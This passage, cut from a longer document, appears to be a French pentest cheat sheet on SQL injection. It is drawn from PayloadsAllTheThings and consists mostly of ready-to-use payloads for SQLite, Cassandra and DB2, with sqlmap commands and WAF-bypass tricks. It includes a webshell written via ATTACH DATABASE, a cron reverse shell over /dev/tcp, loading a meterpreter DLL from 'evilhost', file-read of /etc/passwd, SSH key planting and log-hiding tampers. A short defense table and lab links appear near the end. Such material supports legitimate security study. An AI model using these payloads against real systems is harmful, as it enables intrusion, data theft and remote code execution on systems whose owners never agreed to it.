SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
-- Colonnes d'une table
SELECT GROUP_CONCAT(name) FROM pragma_table_info('table_name');
SELECT name FROM PRAGMA_TABLE_INFO('<TABLE>');
```

### Blind

```sql
-- Boolean : compter les tables / hex de la première lettre
AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < N
AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' LIMIT 1) > HEX('a')
AND CASE WHEN (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table') = HEX('a') THEN 1 ELSE 0 END

-- Error based (oracle booléen)
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A     -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A     -- "malformed JSON"
' AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END  -- erreur si la condition est fausse

-- Time based (heavy query — pas de SLEEP en SQLite)
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))    -- ~1s
```

### Écriture / RCE

```sql
-- Écriture de fichier (fonction writefile, si disponible)
SELECT writefile('/path/to/file', column_name) FROM table_name

-- RCE : webshell PHP via ATTACH DATABASE
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
-- Note : le header binaire "SQLite format 3" précède le code PHP → PHP l'ignore, ça marche.

-- RCE : cron reverse shell via ATTACH DATABASE
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.t (d text);
INSERT INTO cron.t VALUES (char(10)||'* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1'||char(10));--

-- RCE : load_extension (DLL/so chargée)
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
-- Compilation côté attaquant : gcc -shared -fPIC evil.c -o evil.so + fichier .dbconfig
```

> [!tip] SQLite = base **locale** (ex: navigateurs, applis mobile, sauvegardes). L'injection y
> ouvre souvent l'accès au fichier DB **et** au système de fichiers de la victime.

---

## Cassandra

> CQL = pas de `OR` booléen dans WHERE, pas de `UNION`, pas de subquery, pas de `SLEEP`.
> L'angle d'attaque principal = **login bypass** via la syntaxe CQL (`ALLOW FILTERING`) et les commentaires.

```sql
-- Login bypass #1 (terminateur de requête + commentaire)
username: admin' ALLOW FILTERING; %00
password: ANY

-- Login bypass #2 (commentaire)
username: admin'/*
password: */and pass>'
```

> [!warning] Injection = beaucoup plus limitée que les autres SGBD : pas d'extraction
> de données par UNION/blind classique, uniquement des bypass de requête par manipulation CQL.

---

## DB2 (IBM DB2 / AS-400)

### Énumération

```sql
-- Version / info
SELECT service_level FROM sysibm.sysversions
SELECT getvariable('sysibm.version') FROM sysibm.sysdummy1
SELECT * FROM sysproc.env_get_inst_info()
SELECT * FROM sysibmadm.env_inst_info
-- OS / hostname
SELECT os_name, host_name FROM sysibmadm.env_sys_info
-- User courant
SELECT user FROM sysibm.sysdummy1
-- Comptes / privilèges
SELECT * FROM syscat.dbauth                          -- droits des comptes
SELECT * FROM SYSIBM.SYSUSERAUTH                     -- SYSADMAUTH='Y'/'G' = DBA
SELECT * FROM sysibmadm.reg_variables WHERE reg_var_name='DB2PATH'  -- emplacement des fichiers
```

### Time based (heavy query)

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68
```

### Blind

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1    -- 'ADRI' (bypass quotes)
SELECT ascii('A'), chr(65) FROM sysibm.sysdummy1
-- N-ième ligne : ORDER BY ... DESC + FETCH FIRST N ROWS ONLY
-- Opérateurs bitwise : bitand, bitor, bitxor, bitnot, bitandnot
```

### Error based XML

```sql
SELECT xmlagg(xmlrow(table_schema)) FROM sysibm.tables
SELECT xml2clob(xmelement(name t, table_schema)) FROM sysibm.tables
```

### RCE sur IBM i / AS-400 (QSYS2.QCMDEXC)

```sql
-- Exécution de commande OS/400 (QSH)
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
-- Variante 2 étapes : rediriger la sortie puis la lire
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE > /tmp/qsh_output.txt 2>&1'')')
SELECT LINE FROM TABLE(QSYS2.IFS_READ_UTF8('/tmp/qsh_output.txt',2147483647,'NONE'))
```

> [!tip] DB2 : tables système par défaut = `SYSIBM`, `SYSCAT`, `SYSSTAT`, `SYSPUBLIC`, `SYSIBMADM`, `SYSTOOLs`.

---

---

## sqlmap — maîtrise

```bash
# Scan de base
sqlmap -u "http://x/page?id=1" --batch

# Enumerate
sqlmap -u "http://x/page?id=1" --dbs
sqlmap -u "http://x/page?id=1" -D db --tables
sqlmap -u "http://x/page?id=1" -D db -T users --columns
sqlmap -u "http://x/page?id=1" -D db -T users -C username,password --dump
# Flags d'énumération utilisateurs / privilèges
sqlmap -u "http://x/page?id=1" --banner --is-dba --current-user --users --passwords --os=Linux
# Requête SQL arbitraire (après confirmation de l'injection)
sqlmap -u "http://x/page?id=1" --sql-query="SELECT version()"

# Fichiers & shell
sqlmap -u "http://x/page?id=1" --file-read=/etc/passwd
sqlmap -u "http://x/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
sqlmap -u "http://x/page?id=1" --os-shell       # si FILE priv + dossier web
sqlmap -u "http://x/page?id=1" --sql-shell       # shell SQL interactif
sqlmap -u "http://x/page?id=1" --os-pwn          # Meterpreter !
sqlmap -u "http://x/page?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/   # shell SSH
# Injection directe en base (sans vuln web)
sqlmap -d "mysql://user:pass@ip/database" --dump-all

# Précisions techniques
sqlmap -u "http://x/page?id=1" --technique BEUT --time-sec=2
sqlmap -u "http://x/page?id=1" --dbms=mysql --risk=3 --level=5
sqlmap -u "http://x/page?id=1" --tamper=space2comment    # WAF bypass
sqlmap -u "http://x/page?id=1" --proxy=http://127.0.0.1:8080   # voir dans Burp
sqlmap -u "http://x/page?id=1" --proxy=socks5://user:pass@127.0.0.1:1080 --proxy-cred="user:pass"

# Second order / stacked
sqlmap -u "http://x/page?id=1" --stacked-queries
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP>/joomla/administrator/index.php" -D "joomla" -dbs

# From Burp request file
sqlmap -r request.txt --batch
sqlmap -r request.txt -p email --level=5 --risk=2

# Form via POST
sqlmap -u "http://x/login.php" --data="user=admin&pass=test" --current-db

# Point d'injection custom (wildcard *) — header, cookie...
sqlmap -u "http://example.com" --data "username=admin&password=pass" --headers="x-forwarded-for:127.0.0.1*"
# Préfixe / suffixe manuels
sqlmap -u "http://x/page?id=1" -p id --prefix="')" --suffix="-- "
# Code Python évalué (CSRF tokens, encodage, dynamique)
sqlmap -u "http://x/vuln.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).hexdigest()"
# Réduire le nombre de tests (rapide sur grosses cibles)
sqlmap -u "https://x/page.php?cat=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://x/page.php?cat=demo" --test-filter="boolean"
# Crawl + auto-exploit des forms (env. contrôlée uniquement !)
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

### Tamper scripts (WAF bypass)

| Tamper | Effet |
|---|---|
| `space2comment` / `space2dash` / `space2hash` / `space2plus` / `space2randomblank` / `space2mysqlblank` / `space2mssqlblank` | remplace l'espace `' '` par commentaire / `--` / `#` / `+` / caractère blanc aléatoire |
| `apostrophemask` / `apostrophenullencode` / `chardoubleencode` / `charencode` / `charunicodeencode` / `charunicodeescape` / `htmlencode` / `base64encode` | encodages (UTF-8 full-width, unicode double, URL double, HTML, base64...) |
| `equaltolike` / `between` / `greatest` / `least` | remplace `=` / `>` par `LIKE`, `BETWEEN`, `GREATEST`, `LEAST` |
| `modsecurityversioned` / `modsecurityzeroversioned` / `halfversionedmorekeywords` / `versionedkeywords` / `versionedmorekeywords` | commentaires versionnés MySQL `/*!...*/` |
| `commalesslimit` (`LIMIT M,N` → `LIMIT N OFFSET M`) / `commalessmid` | suppression des virgules |
| `unmagicquotes` | quote `'` → `%bf%27` multi-octets (wide byte) |
| `randomcase` / `randomcomments` / `lowercase` / `uppercase` / `multiplespaces` | obfuscation des mots-clés |
| `symboliclogical` | `AND`/`OR` → `&&`/`\|\|` |
| `unionalltounion` | `UNION ALL` → `UNION` |
| `concat2concatws` / `plus2concat` / `plus2fnconcat` | variations CONCAT |
| `sp_password` | ajoute `sp_password` → la requête est masquée dans les logs MSSQL (OPSEC !) |
| `xforwardedfor` / `varnish` | ajoute un faux header `X-Forwarded-For` / `X-originating-IP` (WAF par IP) |
| `0x2char` | `0xHEX` → `CONCAT(CHAR(),...)` |
| `escapequotes` | échappe les quotes par backslash |
| `nonrecursivereplacement` | contourne les filtres `.replace("SELECT","")` non récursifs |
| `ifnull2ifisnull` / `ifnull2casewhenisnull` | variations IFNULL |
| `informationschemacomment` / `percentage` / `overlongutf8(more)` / `bluecoat` / `appendnullbyte` / `securesphere` | divers |

```bash
sqlmap -u "http://target/vuln.php?id=1" --tamper=space2comment,equaltolike,randomcase   # chaîner plusieurs
```

### Tamper script custom

Structure obligatoire (`/usr/share/sqlmap/tamper/mytamper.py`) : `__priority__` (0 normal → 100 prioritaire),
`dependencies()`, `tamper(payload, **kwargs)`. Exemple qui transforme `LIMIT M, N` en `LIMIT N OFFSET M` :

```py
import os, re
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS, PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    singleTimeWarnMessage("tamper '%s' uniquement MySQL" % os.path.basename(__file__).split(".")[0])

def tamper(payload, **kwargs):
    retVal = payload
    m = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if m:
        retVal = retVal.replace(m.group(0), "LIMIT %s OFFSET %s" % (m.group(2), m.group(1)))
    return retVal
```

> [!tip] **Ghauri** (alternative moderne) : `https://github.com/r0oth3x49/ghauri`

---

## WAF Bypass

### No space allowed

```sql
?id=1%09and%091=1%09--      -- tab
?id=1%0Aand%0A1=1%0A--      -- newline
?id=1%0Band%0B1=1%0B--      -- vertical tab
?id=1%A0and%A01=1%A0--      -- non-breaking space
-- Whitespace supportés : MySQL 5 : 09 0A 0B 0C 0D A0 20 / PostgreSQL & SQLite : 09 0A 0D 0C 20 / Oracle : 00 09 0A 0D 0C 20 / MSSQL : 01-1F 20
? id=1/*comment*/AND/**/1=1/**/--       -- commentaire
?id=1/*!12345UNION*//*!12345SELECT*/1--  -- commentaire conditionnel
?id=(1)and(1)=(1)--                       -- parenthèses
```

### No comma allowed

```sql
LIMIT 0,1          → LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1)  → SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4     → UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### No equal allowed

```sql
SUBSTRING(VERSION(),1,1)LIKE(5)
SUBSTRING(VERSION(),1,1)NOT IN(4,3)
SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4
```

### Opérateurs équivalents

```sql
AND → &&        OR → ||
=   → LIKE, REGEXP, BETWEEN
>   → NOT BETWEEN 0 AND X
WHERE → HAVING
```

### MySQL spécifique

```sql
-- Scientific notation (bypass AWS WAF !)
1' or 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2

-- Conditional comments
/*!12345UNION*/ SELECT ...
/*!31337SELECT*/

-- Wide byte / GBK (bypass addslashes)
?id=1%df' and 1=1 --+
-- %df + backslash \ → 連 (caractère GBK valide) → le backslash est "mangé"
%bf' OR 1=1 -- --
%bf%5c
%8C%A8%27 OR 1=1;--
%a1%27

-- Commentaires MySQL (au-delà de -- et /*! */)
#            -- hash
;%00          -- null byte
`             -- backtick (équivalent commentaire dans certains contextes)

-- Autres WAF bypass
1/**/UN/**/ION/**/SELECT
CONCAT(0x75,0x73,0x65,0x72)
```

---

## Cas particuliers

### Second Order SQLi

> L'injection est **stockée** (ex: nom d'utilisateur `attacker'--`) puis **exécutée plus tard**
> par une autre fonctionnalité de l'app. La requête initiale est inoffensive.

```sql
-- 1. Stocké sans effet :
INSERT INTO users (username, email) VALUES ('attacker'--', 'attacker@example.com');
-- 2. Réutilisé plus tard dans une requête non sûre :
SELECT * FROM logs WHERE username = 'attacker'--'  → INJECTION !
```

### Routed SQLi

> Le résultat de la première requête alimente la seconde requête. Payload = hex.

```sql
-- ' union select 1,2#  → hex :
0x2720756e696f6e2073656c65637420312c3223
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

### Polyglot

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### PDO (MySQL emulate prepares)

```bash
# Injecter dans la COLONNE (pas le paramètre) d'un prepared statement PDO
# Détection : col=?%23%00
# Puis injecter via le paramètre :
col=%3f%23%00&name=x%60 FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
```

---

## Détection & Défense

| Réponse | Détail |
|---|---|
| **Requêtes paramétrées / ORM** | C'est LA défense (jamais de concaténation SQL) — attention PDO en mode emulate |
| **Moindre privilège** | Le compte BDD de l'app ne doit pas être DBA / `FILE` |
| **WAF** | Règle basique, contournable (voir WAF bypass ci-dessus) |
| **Masquer les erreurs** | Pas de stacktrace affichée → force le blind |
| **Surveillance** | Logs d'erreurs SQL, patterns d'entrées inhabituelles, requêtes lentes (SLEEP) |
| **Input validation** | Types stricts (int, email...), longueur, allowlist |

---

## Labs

- PortSwigger Web Security Academy — SQL injection : https://portswigger.net/web-security/all-labs#sql-injection
- Root-Me : SQL injection (Auth, String, Numeric, Routed, Error, Insert, File reading, Time, Blind, Second Order, Filter bypass, Truncation) : https://www.root-me.org/

---

## Tips & Pièges

> [!tip] **Ordre logique d'attaque**
> 1. Détecter (`'` → erreur ?) → 2. Identifier le SGBD → 3. Compter les colonnes → 4. UNION ou blind → 5. Dump → 6. FILE/RCE si droits.
> Toujours essayer **sqlmap en second** (vérifier le manuel d'abord).

> [!warning] **Pièges**
> - `--os-shell` exige `FILE` privilege + dossier web en écriture. Teste d'abord `--file-read=/etc/passwd`.
> - MSSQL `xp_cmdshell` désactivé par défaut → il faut le réactiver.
> - Oracle : la plupart des injections fichiers/RCE ne marchent qu'en **stacked query**.
> - `UNION` exige le même nombre de colonnes **et** des types compatibles.
> - Payload toujours-vrai (`or 1=1`) sur un endpoint qui supprime = danger.
> - Les hashes de mots de passe + salt (bcrypt) rendent le bypass UNION hash inutile.

---

## Liens

- [[XSS (Cross-Site Scripting)| XSS]]
- [[SSRF| SSRF]]
- [[Injection de commandes| Injection de commandes]]
- [[LFI et RFI| LFI / RFI]]
- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
- Source : [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)
